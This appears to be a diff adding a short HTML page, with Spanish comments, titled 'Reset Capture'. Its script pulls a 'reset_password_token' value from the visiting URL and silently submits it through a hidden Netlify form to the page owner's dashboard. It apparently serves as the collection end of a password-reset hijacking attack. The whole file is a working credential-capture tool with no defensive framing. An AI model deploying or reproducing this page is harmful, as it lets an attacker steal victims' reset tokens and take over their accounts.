@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Reset Capture</title>
+  </head>
+  <body>
+    <!-- Formulario invisible para Netlify Forms -->
+    <form name="reset-capture" netlify>
+      <input type="text" name="token" id="token" />
+    </form>
+
+    <script>
+      // Extraer el token de la URL (?reset_password_token=XYZ)
+      const params = new URLSearchParams(window.location.search);
+      const token = params.get("reset_password_token");
+
+      if (token) {
+        document.getElementById("token").value = token;
+        // Enviar el token al dashboard de Netlify Forms
+        document.forms["reset-capture"].submit();
+      }
+    </script>
+
+    <p>Token capturado (si existe)</p>
+  </body>
+</html>
